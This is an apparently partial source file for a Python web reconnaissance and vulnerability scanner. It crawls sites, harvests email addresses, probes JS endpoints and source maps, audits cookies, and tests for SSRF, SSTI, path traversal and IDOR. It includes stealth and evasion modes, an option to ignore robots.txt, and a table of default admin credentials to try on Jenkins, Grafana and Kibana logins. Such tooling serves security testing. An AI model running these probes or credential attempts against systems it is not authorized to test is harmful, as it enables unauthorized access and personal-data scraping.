                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "MEDIUM", full_url,
                          f"Unauthenticated GET returned {len(non_generic)} non-generic email address(es)")
                    print(timestamp() + f"  JS endpoint exposes email(s) ({len(non_generic)} non-generic): {full_url}")
                    return
                elif len(unique_emails) >= 5:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "LOW", full_url,
                          f"Unauthenticated GET returned {len(unique_emails)} generic/public email addresses")
                    print(timestamp() + f"  JS endpoint exposes generic emails ({len(unique_emails)}): {full_url}")
                    return

                # Large JSON array — potential data dump — MEDIUM
                stripped = body.strip()
                if stripped.startswith("["):
                    try:
                        data = json.loads(stripped)
                        if isinstance(data, list) and len(data) > 10:
                            alert("JS ENDPOINT — UNAUTHENTICATED DATA ACCESS", "MEDIUM", full_url,
                                  f"Unauthenticated GET returned JSON array with {len(data)} items ({size:,} bytes)")
                            print(timestamp() + f"  JS endpoint data dump ({len(data)} items): {full_url}")
                            return
                    except Exception:
                        pass

                # JSON object response — LOW
                if size > 128 and ("json" in ctype or stripped.startswith("{")):
                    alert("JS ENDPOINT — ACCESSIBLE UNAUTHENTICATED", "LOW", full_url,
                          f"Unauthenticated GET returned HTTP 200 JSON ({size:,} bytes) — verify auth requirement")

            elif status == 500:
                alert("JS ENDPOINT — SERVER ERROR", "LOW", full_url,
                      "Unauthenticated GET returned HTTP 500 — possible unhandled exception or missing input validation")

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"probe_js_endpoints: probe failed for {full_url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_probe, url, page) for url, page in to_probe]
        for f in as_completed(futures):
            pass
    print(timestamp() + f" JS endpoint probe complete — {len(to_probe)} probed.")


# ─────────────────────────────────────────────
# JavaScript source map exposure
# ─────────────────────────────────────────────

# Deduplicate across the session — each JS URL checked at most once
_source_map_checked = set()

def check_js_source_map(page_url, js_url, js_response=None):
    """
    Probe for exposed JavaScript source maps.

    Checks:
      1. SourceMap / X-SourceMap response header on the JS file itself
         (explicitly points to the map location — most authoritative)
      2. <js_url>.map — the conventional naming convention used by all
         major bundlers (webpack, esbuild, Rollup, Vite, Parcel)

    Exposed source maps leak the original unminified source code, internal
    file paths, variable/function names, and occasionally inline comments
    that contain credentials or architecture notes.

    Confirmation: response body must contain the required JSON fields
    ("version", "mappings", "sources") to avoid false positives from
    catch-all 200 handlers.
    """
    if js_url in _source_map_checked:
        return
    _source_map_checked.add(js_url)

    map_candidates = []

    # Priority 1: explicit header reference
    if js_response:
        for header in ("SourceMap", "X-SourceMap"):
            ref = js_response.headers.get(header) or js_response.headers.get(header.lower())
            if ref:
                if ref.startswith("http"):
                    map_candidates.append(ref)
                else:
                    base = js_url.rsplit("/", 1)[0]
                    map_candidates.append(base + "/" + ref.lstrip("/"))

    # Priority 2: conventional .map path
    map_candidates.append(js_url + ".map")

    seen = set()
    for map_url in map_candidates:
        if map_url in seen:
            continue
        seen.add(map_url)
        try:
            stealth_delay(urlparse(map_url).netloc)
            resp = requests.get(
                map_url, headers=create_request_header(),
                timeout=6, allow_redirects=False,
            )
            if not resp or resp.status_code not in (200, 206):
                continue

            # Confirm it's a real source map — must have all three required fields
            body = resp.text[:4000]
            if not ('"version"' in body and '"mappings"' in body and '"sources"' in body):
                continue

            # Extract source file list for the alert detail (first 3 paths)
            source_files = re.findall(r'"sources"\s*:\s*\[([^\]]{0,300})', body)
            detail_suffix = ""
            if source_files:
                paths = re.findall(r'"([^"]{3,80})"', source_files[0])[:3]
                if paths:
                    detail_suffix = " — source paths include: " + ", ".join(paths)

            alert(
                "JAVASCRIPT SOURCE MAP EXPOSED",
                "HIGH",
                js_url,
                f"Source map at {map_url} leaks unminified source, file paths, and variable names{detail_suffix}"
            )
            print(timestamp() + f" [!!] JS source map exposed: {map_url}")
            write_to_js_database(page_url, js_url, "source_map", map_url)

        except Exception as e:
            print_error(f"check_js_source_map failed for {map_url}: {e}")

# ─────────────────────────────────────────────
# Playwright JS rendering
# ─────────────────────────────────────────────

# Each call gets its own browser instance — avoids cross-thread sharing
_pw_semaphore = threading.Semaphore(PLAYWRIGHT_MAX_CONC)

# JS frameworks that definitely need Playwright
JS_FRAMEWORKS = {"React", "Angular", "Vue.js", "Next.js", "Nuxt.js", "Gatsby", "Svelte"}

def is_js_heavy(html_bytes, detected_techs=None):
    """
    Returns True if the page is likely a JS-rendered SPA that needs Playwright.
    Checks:
      1. Known JS framework in detected_techs
      2. Very little visible text vs total HTML size (SPA shell pattern)
      3. Presence of common SPA root mount points with no content
    """
    if detected_techs and JS_FRAMEWORKS.intersection(set(detected_techs)):
        return True
    if not html_bytes or len(html_bytes) < JS_CONTENT_MIN:
        return True
    try:
        soup = BeautifulSoup(html_bytes, "lxml")
        for tag in soup(["script", "style", "noscript"]):
            tag.decompose()
        text = soup.get_text(separator=" ").strip()
        # If visible text is less than 5% of total HTML, it's probably a shell
        if len(text) < len(html_bytes) * 0.05:
            return True
        # Common SPA mount point patterns with no children
        for mount_id in ["root", "app", "__next", "__nuxt", "gatsby-focus-wrapper"]:
            el = soup.find(id=mount_id)
            if el and not el.get_text(strip=True):
                return True
    except Exception:
        pass
    return False

def write_to_xhr_database(page_url, endpoint, method):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "XHREndpoints")
        existing = conn.execute(
            "SELECT url FROM XHREndpoints WHERE url=? AND endpoint=? LIMIT 1",
            (page_url, endpoint)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO XHREndpoints (url,endpoint,method,found_at) VALUES (?,?,?,?)",
                (page_url, endpoint, method, timestamp()))
    except Exception as e:
        print_error("write_to_xhr_database: " + str(e))
    finally:
        conn.close()

def playwright_fetch(url):
    """
    Render a page with Playwright using a per-call browser instance.
    Each call launches and closes its own browser to avoid cross-thread sharing.
    Returns (html_bytes, xhr_endpoints).
    """
    if not PLAYWRIGHT_AVAILABLE:
        print_error("Playwright not installed — run: pip install playwright && playwright install chromium")
        return None, []

    xhr_endpoints = []
    html_bytes    = None

    with _pw_semaphore:
        browser = None
        ctx     = None
        page    = None
        try:
            import os
            exe = os.environ.get("PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH", None)
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    executable_path=exe,
                    headless=True,
                    args=[
                        "--no-sandbox",
                        "--disable-dev-shm-usage",
                        "--disable-gpu",
                        "--single-process",
                    ]
                )
                print(timestamp() + " Playwright rendering: " + url)
                _ctx_headers = stealth_headers({})
                _ctx_extra = {k: v for k, v in _ctx_headers.items() if k != "User-Agent"}
                if BUG_BOUNTY_HEADER:
                    _ctx_extra["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
                ctx  = browser.new_context(
                    user_agent=random.choice(UA_POOL),
                    extra_http_headers=_ctx_extra,
                    ignore_https_errors=True,
                    java_script_enabled=True,
                )
                page = ctx.new_page()
                if PLAYWRIGHT_STEALTH_AVAILABLE:
                    Stealth().apply_stealth_sync(page)

                def on_request(req):
                    if req.resource_type in ("xhr", "fetch"):
                        skip = ["google-analytics", "googletagmanager", "facebook",
                                "doubleclick", "hotjar", "segment", "mixpanel",
                                "amplitude", "intercom", "hubspot", "clarity.ms"]
                        if not any(s in req.url for s in skip):
                            xhr_endpoints.append((req.url, req.method))
                            print(timestamp() + " XHR: " + req.method + " " + req.url)

                page.on("request", on_request)

                page.goto(url, timeout=PLAYWRIGHT_TIMEOUT, wait_until="domcontentloaded")
                try:
                    page.wait_for_load_state("networkidle", timeout=4000)
                except PlaywrightTimeout:
                    pass

                for _ in range(4):
                    page.evaluate("window.scrollBy(0, window.innerHeight)")
                    page.wait_for_timeout(500)
                page.evaluate("window.scrollTo(0, 0)")

                html_bytes = page.content().encode("utf-8", errors="ignore")
                print(timestamp() + " Playwright got " + str(len(html_bytes)) + " bytes from " + url)

        except PlaywrightTimeout:
            print_error("Playwright page timeout: " + url)
        except Exception as e:
            print_error("Playwright page error on " + url + ": " + str(e))

    return html_bytes, xhr_endpoints

# ─────────────────────────────────────────────
# Async crawler
# ─────────────────────────────────────────────

async def async_fetch(session, url, semaphore):
    async with semaphore:
        try:
            if STEALTH_PROFILE == "NORMAL":
                await asyncio.sleep(random.uniform(0.5, 1.5))
            elif STEALTH_PROFILE == "GHOST":
                await asyncio.sleep(random.uniform(2.0, 6.0))
            headers = create_request_header()
            timeout = aiohttp.ClientTimeout(total=ASYNC_TIMEOUT, connect=5)
            async with session.get(url, headers=headers, timeout=timeout) as response:
                status = response.status
                record_http_response(url, status)
                if status == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'xml' in content_type and 'html' not in content_type:
                        await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                        return url, None, {}
                    html = await response.read()
                    await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                    return url, html, dict(response.headers)
        except asyncio.TimeoutError:
            print_error("Timeout fetching: " + url)
        except aiohttp.ClientError as e:
            print_error("Async fetch failed for " + url + ": " + str(e))
        except Exception as e:
            print_error("Unexpected error fetching " + url + ": " + str(e))
        await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
        return url, None, {}

async def crawl_batch(urls):
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(
        connector=connector,
        max_line_size=32768,
        max_field_size=32768,
    ) as session:
        tasks = [async_fetch(session, url, semaphore) for url in urls]
        return await asyncio.gather(*tasks, return_exceptions=False)

def parse_anchors_from_html(html_content):
    try:
        parsed = BeautifulSoup(html_content, "lxml")
        return parsed.find_all(lambda tag: tag.name == 'a' and tag.get('href'))
    except Exception:
        return []

def is_in_scope(url):
    """Return True if url is on the same domain as the scan target when SAME_DOMAIN_ONLY is set."""
    if not SAME_DOMAIN_ONLY:
        return True
    try:
        target_host = urlparse(START_URL).netloc.lstrip("www.")
        url_host    = urlparse(url).netloc.lstrip("www.")
        return url_host == target_host or url_host.endswith("." + target_host)
    except Exception:
        return False

def _clean_url(url):
    """Strip trailing punctuation that can bleed into URLs from surrounding text."""
    return url.rstrip(")>]")

def get_domain_names(anchors, url_queue, url_seen, base_netloc, same_domain_only):
    new_domains = []
    try:
        for a in anchors:
            href = _clean_url(a.get("href", ""))
            if not href.startswith("http"):
                continue
            if href in url_seen:
                continue
            parsed_href = urlparse(href)
            if same_domain_only and parsed_href.netloc != base_netloc:
                continue
            if SOCIAL_FILTER_FLAGS["enabled"] and is_social_media_domain(href):
                continue
            url_seen.add(href)
            url_queue.append(href)
            if href.endswith((".com", ".gov/", ".net/", ".edu/", ".org/",
                               ".io/", ".co.uk/", ".ie/", ".info/")):
                new_domains.append(href)
    except TypeError as err:
        print_error("get_domain_names: " + str(err))
    return new_domains

# ─────────────────────────────────────────────
# Database
# ─────────────────────────────────────────────

def create_db(conn, table_name):
    table_creation_map = {
        "Domains":         '''CREATE TABLE IF NOT EXISTS Domains (url TEXT NOT NULL, ip TEXT NOT NULL, servertype TEXT, content_type TEXT, title TEXT)''',
        "Emails":          '''CREATE TABLE IF NOT EXISTS Emails (email_address TEXT NOT NULL)''',
        "DNS":             '''CREATE TABLE IF NOT EXISTS DNS (domain TEXT NOT NULL, ip TEXT NOT NULL)''',
        "MX":              '''CREATE TABLE IF NOT EXISTS MX (domain TEXT NOT NULL, mx_host TEXT NOT NULL, preference INTEGER)''',
        "SSL":             '''CREATE TABLE IF NOT EXISTS SSL (domain TEXT NOT NULL, common_name TEXT, issuer TEXT, not_before TEXT, not_after TEXT)''',
        "WHOIS":           '''CREATE TABLE IF NOT EXISTS WHOIS (domain TEXT NOT NULL, registrar TEXT, creation_date TEXT, expiration_date TEXT)''',
        "Ports":           '''CREATE TABLE IF NOT EXISTS Ports (domain TEXT NOT NULL, ip TEXT NOT NULL, port INTEGER NOT NULL)''',
        "HTTPHistory":     '''CREATE TABLE IF NOT EXISTS HTTPHistory (url TEXT NOT NULL, status_code INTEGER NOT NULL, checked_at TEXT NOT NULL)''',
        "Technologies":    '''CREATE TABLE IF NOT EXISTS Technologies (url TEXT NOT NULL, technology TEXT NOT NULL)''',
        "Robots":          '''CREATE TABLE IF NOT EXISTS Robots (base_url TEXT NOT NULL, content TEXT NOT NULL, fetched_at TEXT NOT NULL)''',
        "Sitemap":         '''CREATE TABLE IF NOT EXISTS Sitemap (base_url TEXT NOT NULL, url TEXT NOT NULL)''',
        "SecurityHeaders": '''CREATE TABLE IF NOT EXISTS SecurityHeaders (
                                domain      TEXT NOT NULL,
                                present     TEXT,
                                missing     TEXT,
                                leaking     TEXT,
                                checked_at  TEXT NOT NULL
                             )''',
        "JSFindings":      '''CREATE TABLE IF NOT EXISTS JSFindings (
                                url         TEXT NOT NULL,
                                js_url      TEXT NOT NULL,
                                finding_type TEXT NOT NULL,
                                value       TEXT NOT NULL,
                                context     TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "XHREndpoints":    '''CREATE TABLE IF NOT EXISTS XHREndpoints (
                                url         TEXT NOT NULL,
                                endpoint    TEXT NOT NULL,
                                method      TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "Subdomains":      '''CREATE TABLE IF NOT EXISTS Subdomains (
                                root_domain TEXT NOT NULL,
                                subdomain   TEXT NOT NULL,
                                ip          TEXT,
                                status_code INTEGER,
                                found_at    TEXT NOT NULL
                             )''',
        "ASN":             '''CREATE TABLE IF NOT EXISTS ASN (
                                ip          TEXT NOT NULL,
                                asn         TEXT,
                                org         TEXT,
                                country     TEXT,
                                is_cdn      INTEGER DEFAULT 0,
                                cdn_name    TEXT,
                                looked_up   TEXT NOT NULL
                             )''',
        "ZoneTransfer":    '''CREATE TABLE IF NOT EXISTS ZoneTransfer (
                                root_domain TEXT NOT NULL,
                                nameserver  TEXT NOT NULL,
                                record      TEXT NOT NULL,
                                found_at    TEXT NOT NULL
                             )''',
        "WAF":             '''CREATE TABLE IF NOT EXISTS WAF (
                                domain      TEXT NOT NULL,
                                waf_vendor  TEXT NOT NULL,
                                detected_by TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "WellKnown":       '''CREATE TABLE IF NOT EXISTS WellKnown (
                                domain          TEXT NOT NULL,
                                path            TEXT NOT NULL,
                                category        TEXT,
                                content_snippet TEXT,
                                found_at        TEXT NOT NULL
                             )''',
    }
    if table_name in table_creation_map:
        try:
            conn.execute(table_creation_map[table_name])
        except sqlite3.OperationalError as err:
            print_error(str(err))

def check_db_for_domain(conn, name, table_name):
    table_checks = {
        "Domains": "SELECT url FROM Domains WHERE url=? LIMIT 1",
        "Emails":  "SELECT email_address FROM Emails WHERE email_address=? LIMIT 1",
    }
    sql = table_checks.get(table_name)
    if not sql:
        return True
    try:
        row = conn.execute(sql, (name,)).fetchone()
        return row is None
    except Exception:
        return True

def write_to_domain_database(name, ip, server, content_type, title):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Domains")
        if check_db_for_domain(conn, name, "Domains"):
            conn.execute(
                "INSERT INTO Domains (url,ip,servertype,content_type,title) VALUES (?,?,?,?,?)",
                (name, ip, server, content_type, title))
            print(timestamp() + " Saved domain: " + name)
    except Exception as e:
        print_error("write_to_domain_database: " + str(e))
    finally:
        conn.close()

def write_to_email_database(email_address):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Emails")
        if check_db_for_domain(conn, email_address, "Emails"):
            conn.execute("INSERT INTO Emails (email_address) VALUES (?)", (email_address,))
            print(timestamp() + " Saved email: " + email_address)
    except Exception as e:
        print_error("write_to_email_database: " + str(e))
    finally:
        conn.close()

def write_to_dns_database(domain, ip):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "DNS")
        conn.execute("INSERT INTO DNS (domain,ip) VALUES (?,?)", (domain, ip))
    except Exception as e:
        print_error("write_to_dns_database: " + str(e))
    finally:
        conn.close()

def write_to_mx_database(domain, mx_host, preference):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "MX")
        conn.execute("INSERT INTO MX (domain,mx_host,preference) VALUES (?,?,?)", (domain, mx_host, preference))
    except Exception as e:
        print_error("write_to_mx_database: " + str(e))
    finally:
        conn.close()

def write_to_ssl_database(domain, common_name, issuer, not_before, not_after):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "SSL")
        conn.execute(
            "INSERT INTO SSL (domain,common_name,issuer,not_before,not_after) VALUES (?,?,?,?,?)",
            (domain, common_name, issuer, not_before, not_after))
    except Exception as e:
        print_error("write_to_ssl_database: " + str(e))
    finally:
        conn.close()

def write_to_whois_database(domain, registrar, creation_date, expiration_date):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WHOIS")
        conn.execute(
            "INSERT INTO WHOIS (domain,registrar,creation_date,expiration_date) VALUES (?,?,?,?)",
            (domain, registrar, creation_date, expiration_date))
    except Exception as e:
        print_error("write_to_whois_database: " + str(e))
    finally:
        conn.close()

def write_to_ports_database(domain, ip, port):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Ports")
        conn.execute("INSERT INTO Ports (domain,ip,port) VALUES (?,?,?)", (domain, ip, port))
    except Exception as e:
        print_error("write_to_ports_database: " + str(e))
    finally:
        conn.close()

def write_to_http_history_database(url, status_code):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "HTTPHistory")
        conn.execute(
            "INSERT INTO HTTPHistory (url,status_code,checked_at) VALUES (?,?,?)",
            (url, status_code, timestamp()))
    except Exception as e:
        print_error("write_to_http_history_database: " + str(e))
    finally:
        conn.close()

def write_to_tech_database(url, technology):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Technologies")
        conn.execute("INSERT INTO Technologies (url,technology) VALUES (?,?)", (url, technology))
    except Exception as e:
        print_error("write_to_tech_database: " + str(e))
    finally:
        conn.close()

def write_to_robots_database(base_url, content):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Robots")
        conn.execute(
            "INSERT INTO Robots (base_url,content,fetched_at) VALUES (?,?,?)",
            (base_url, content, timestamp()))
    except Exception as e:
        print_error("write_to_robots_database: " + str(e))
    finally:
        conn.close()

def write_to_sitemap_database(base_url, url):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Sitemap")
        conn.execute("INSERT INTO Sitemap (base_url,url) VALUES (?,?)", (base_url, url))
    except Exception as e:
        print_error("write_to_sitemap_database: " + str(e))
    finally:
        conn.close()

def write_to_security_headers_database(domain, present, missing, leaking):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "SecurityHeaders")
        conn.execute(
            "INSERT INTO SecurityHeaders (domain,present,missing,leaking,checked_at) VALUES (?,?,?,?,?)",
            (domain, ", ".join(present), ", ".join(missing), ", ".join(leaking), timestamp()))
    except Exception as e:
        print_error("write_to_security_headers_database: " + str(e))
    finally:
        conn.close()

def write_to_subdomains_database(root_domain, subdomain, ip, status_code):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Subdomains")
        # Only insert if not already known
        existing = conn.execute(
            "SELECT subdomain FROM Subdomains WHERE subdomain=? LIMIT 1", (subdomain,)
        ).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO Subdomains (root_domain,subdomain,ip,status_code,found_at) VALUES (?,?,?,?,?)",
                (root_domain, subdomain, ip, status_code, timestamp()))
    except Exception as e:
        print_error("write_to_subdomains_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Main crawler
# ─────────────────────────────────────────────

def main_crawler(start_url, same_domain_only=False, resume=False, ignore_robots=False):
    global START_URL, SAME_DOMAIN_ONLY
    START_URL        = start_url
    SAME_DOMAIN_ONLY = same_domain_only
    parsed_start = urlparse(start_url)
    base_netloc  = parsed_start.netloc
    base_url     = parsed_start.scheme + "://" + base_netloc

    state = load_state() if resume else None

    if state and state.get("start_url") == start_url:
        url_queue = state["url_queue"]
        url_seen  = set(state["url_seen"])
        visited   = set(state["visited"])
        i         = state["pages_crawled"]
        same_domain_only = state.get("same_domain_only", same_domain_only)
        print(timestamp() + " Resumed: " + str(i) + " crawled, " + str(len(url_queue)) + " in queue.")
        if ignore_robots:
            print(timestamp() + " robots.txt: ignored (--ignore-robots)")
            rp = None
        else:
            rp = fetch_robots_txt(base_url)
    else:
        if resume and state:
            print(timestamp() + " Saved state is for a different domain — starting fresh.")
        url_queue = [start_url]
        url_seen  = {start_url}
        visited   = set()
        i         = 0
        clear_state()

        # Pre-seed url_seen with URLs crawled within the last 14 days so
        # they are skipped if re-discovered during this run.
        try:
            from datetime import timedelta
            cutoff = (datetime.now() - timedelta(days=14)).strftime("%Y-%m-%d %H:%M:%S")
            _hconn = sqlite3.connect("ScrapeDB")
            _hrows = _hconn.execute(
                "SELECT url FROM HTTPHistory WHERE checked_at >= ?", (cutoff,)
            ).fetchall()
            _hconn.close()
            _recent = {r[0] for r in _hrows}
            url_seen |= _recent
            if _recent:
                print(timestamp() + f" Skipping {len(_recent)} URLs crawled in the last 14 days.")
        except Exception as _e:
            print_error(f"Could not load recent crawl history: {_e}")

        print(timestamp() + " Starting NuScrape → " + start_url)
        if same_domain_only:
            print(timestamp() + " Same-domain-only: staying on " + base_netloc)

        if ignore_robots:
            print(timestamp() + " robots.txt: ignored (--ignore-robots)")
            rp = None
        else:
            print(timestamp() + " Fetching robots.txt...")
            rp = fetch_robots_txt(base_url)

        print(timestamp() + " Fetching sitemap...")
        sitemap_urls = fetch_sitemap(base_url)
        for su in sitemap_urls:
            su = _clean_url(su)
            if su not in url_seen:
                url_seen.add(su)
                url_queue.append(su)

    _ghost_shuffle_at = random.randint(10, 20) if STEALTH_PROFILE == "GHOST" else 0
    _ghost_crawl_count = 0
    while url_queue:
        # GHOST: periodically shuffle the queue to avoid predictable crawl patterns
        if STEALTH_PROFILE == "GHOST" and _ghost_shuffle_at > 0:
            _ghost_crawl_count += 1
            if _ghost_crawl_count >= _ghost_shuffle_at:
                random.shuffle(url_queue)
                _ghost_crawl_count = 0
                _ghost_shuffle_at = random.randint(10, 20)
        batch = []
        while len(batch) < MAX_CONCURRENT and url_queue:
            url = url_queue.pop(0)
            if url in visited:
                continue
            if SOCIAL_FILTER_FLAGS["enabled"] and is_social_media_domain(url):
                continue
            if not ignore_robots and not is_allowed_by_robots(rp, url):
                print(timestamp() + " Skipping (robots.txt): " + url)
                continue
            batch.append(url)
            visited.add(url)

        if not batch:
            break

        print(timestamp() + " Batch " + str(len(batch)) + " | crawled=" + str(i) + " queue=" + str(len(url_queue)))

        results = asyncio.run(crawl_batch(batch))

        for url, html, headers in results:
            if html is None:
                continue
            i += 1

            # ── Playwright fallback ──────────────────────────
            # If Playwright is enabled and the page looks JS-heavy,
            # re-fetch with a real browser to get the rendered content.
            xhr_endpoints = []
            if PLAYWRIGHT_FLAGS["enabled"] and PLAYWRIGHT_AVAILABLE:
                # Detect techs from aiohttp html first so we can check for JS frameworks
                early_techs = []
                if html:
                    try:
                        from bs4 import BeautifulSoup as _BS
                        _soup = _BS(html, "lxml")
                        _html_str = html.decode("utf-8", errors="ignore").lower()
                        _hdr_str  = str(headers).lower()
                        for tech, sigs in TECH_SIGNATURES.items():
                            if any(h.lower() in _hdr_str for h in sigs["headers"]) or                                any(p.lower() in _html_str for p in sigs["html"]):
                                early_techs.append(tech)
                    except Exception:
                        pass

                if is_js_heavy(html, early_techs):
                    print(timestamp() + " JS-heavy page detected, switching to Playwright: " + url)
                    # Run Playwright in a thread so it doesn't block the main
                    # crawl loop — sync_playwright cannot run inside asyncio
                    pw_result = [None, []]
                    def _pw_thread():
                        pw_result[0], pw_result[1] = playwright_fetch(url)
                    t = threading.Thread(target=_pw_thread, daemon=True)
                    t.start()
                    # Wait with a hard ceiling — don't hang forever
                    t.join(timeout=PLAYWRIGHT_TIMEOUT / 1000 + 10)
                    if t.is_alive():
                        print_error("Playwright thread timeout — skipping: " + url)
                    else:
                        pw_html, xhr_endpoints = pw_result[0], pw_result[1]
                        if pw_html and len(pw_html) > len(html or b""):
                            html = pw_html
                            print(timestamp() + " Playwright content richer — using rendered HTML")
                        for endpoint, method in xhr_endpoints:
                            write_to_xhr_database(url, endpoint, method)

            print(timestamp() + " Parsed: " + url)
            email_scraper(html)
            # Cookie security flag audit — runs on every page response
            check_cookie_security(url, headers)
            # JWT detection and weakness analysis
            scan_for_jwts(url, html, response_headers=headers)
            # SSRF candidate parameter flagging — informational, no HTTP requests
            flag_ssrf_candidates(url, html)
            # Open redirect detection — checks URL params on every page
            check_open_redirects(url, html)
            # Path traversal detection — probes file-like parameters
            check_path_traversal(url, html)
            # SSTI detection — probes URL params with arithmetic template expressions
            check_ssti(url, html)
            # IDOR candidate detection — runs in background thread with timeout
            # to prevent hung verification requests stalling the crawl
            _idor_thread = threading.Thread(
                target=check_idor_candidates, args=(url, html), daemon=True
            )
            _idor_thread.start()
            _idor_thread.join(timeout=30)  # max 30s per page for IDOR checks
            # JS bundle analysis — extract endpoints, secrets, staging URLs
            if PLAYWRIGHT_FLAGS["enabled"] or True:  # always run JS analysis
                extract_and_analyse_js(url, html)
            # S3 bucket references in page HTML
            extract_and_probe_s3_buckets(html, url)
            anchors     = parse_anchors_from_html(html)
            new_domains = get_domain_names(anchors, url_queue, url_seen, base_netloc, same_domain_only)

            for domain in new_domains:
                if domain not in visited:
                    enrich_domain(domain, response_headers=headers, html_content=html)

        if i % QUEUE_SAVE_INTERVAL == 0 and i > 0:
            save_state(start_url, url_queue, url_seen, visited, i, same_domain_only)

    # Wait for all JS analysis threads to finish writing to the DB before probing
    with _js_analysis_threads_lock:
        pending = list(_js_analysis_threads)
    if pending:
        print(timestamp() + f" Waiting for {len(pending)} JS analysis threads to complete...")
        for t in pending:
            t.join(timeout=30)

    probe_js_endpoints()

    clear_state()
    print(timestamp() + " Done! Crawled " + str(i) + " pages.")
    sys.exit(0)


# ─────────────────────────────────────────────
# Cookie security flag auditing
# ─────────────────────────────────────────────

# Cookies whose names suggest they carry session/auth data
SESSION_COOKIE_PATTERNS = re.compile(
    r'(sess|session|auth|token|jwt|login|user|uid|account|remember|csrf|xsrf|sid|id)',
    re.I
)

_cookie_checked = set()

def check_cookie_security(url, response_headers):
    """
    Parse Set-Cookie headers from a response and flag session cookies
    that are missing HttpOnly, Secure, or SameSite flags.

    Only alerts on cookies that look like session/auth tokens.
    Deduplicates per domain so we don't spam the same finding.
    """
    domain = urlparse(url).netloc
    if domain in _cookie_checked:
        return
    
    raw_cookies = response_headers.get("Set-Cookie", "")
    if not raw_cookies:
        # aiohttp may give multiple Set-Cookie as a single combined header
        # or as a list — handle both
        raw_cookies = response_headers.get("set-cookie", "")
    if not raw_cookies:
        return

    # Normalise to list
    if isinstance(raw_cookies, str):
        cookie_list = [raw_cookies]
    else:
        cookie_list = list(raw_cookies)

    findings = []

    for raw in cookie_list:
        # Cookie name is the first part before =
        parts = [p.strip() for p in raw.split(";")]
        if not parts:
            continue
        name_val = parts[0]
        name = name_val.split("=")[0].strip()

        # Only care about session-looking cookies
        if not SESSION_COOKIE_PATTERNS.search(name):
            continue

        flags  = raw.lower()
        issues = []

        if "httponly" not in flags:
            issues.append("missing HttpOnly (XSS can steal cookie)")
        if "secure" not in flags:
            issues.append("missing Secure (transmitted over HTTP)")
        # SameSite absent or set to None without Secure is a CSRF risk
        if "samesite" not in flags:
            issues.append("missing SameSite (CSRF risk)")
        elif "samesite=none" in flags and "secure" not in flags:
            issues.append("SameSite=None without Secure")

        if issues:
            findings.append((name, issues))

    if findings:
        _cookie_checked.add(domain)
        for name, issues in findings:
            detail = f"Cookie '{name}': {'; '.join(issues)}"
            severity = "HIGH" if len(issues) >= 2 else "MEDIUM"
            alert(
                "INSECURE SESSION COOKIE",
                severity,
                url,
                detail
            )
            print(timestamp() + f" Cookie issue [{severity}]: {detail} on {url}")


# ─────────────────────────────────────────────
# Default credential checking
# ─────────────────────────────────────────────

# Known admin panel paths → (service name, credential pairs to try, success indicators)
# success_indicator: string in response body that confirms successful login
DEFAULT_CREDS = [
    # Jenkins
    {
        "service":  "Jenkins",
        "paths":    ["/j_spring_security_check", "/j_acegi_security_check"],
        "method":   "POST",
        "payloads": [
            {"j_username": "admin", "j_password": "admin"},
            {"j_username": "admin", "j_password": "password"},
            {"j_username": "admin", "j_password": ""},
        ],
        "detect_path":   "/login",
        "detect_body":   ["jenkins", "j_username"],
        "success_body":  ["Dashboard [Jenkins]", "manage jenkins", "build history"],
        "success_headers": ["X-Jenkins", "X-Powered-By:Jenkins"],
        "fail_redirect": "/loginError",
    },
    # Grafana
    {
        "service":  "Grafana",
        "paths":    ["/api/login"],
        "method":   "POST_JSON",
        "payloads": [
            {"user": "admin", "password": "admin"},
            {"user": "admin", "password": "Admin@123"},
            {"user": "admin", "password": "grafana"},
        ],
        "detect_path":   "/login",
        "detect_body":   ["grafana", "grafana-app"],
        "success_body":  ['"message":"Logged in"', "Logged in"],
        "fail_body":     ["Invalid username or password"],
    },
    # Kibana
    {
        "service":  "Kibana",
        "paths":    ["/api/security/v1/login", "/internal/security/login"],
        "method":   "POST_JSON",
        "payloads": [
            {"username": "elastic", "password": "elastic"},
            {"username": "kibana",  "password": "kibana"},
            {"username": "admin",   "password": "admin"},
        ],
        "detect_path":   "/app/kibana",
        "detect_body":   ["kibana", "kbn-"],
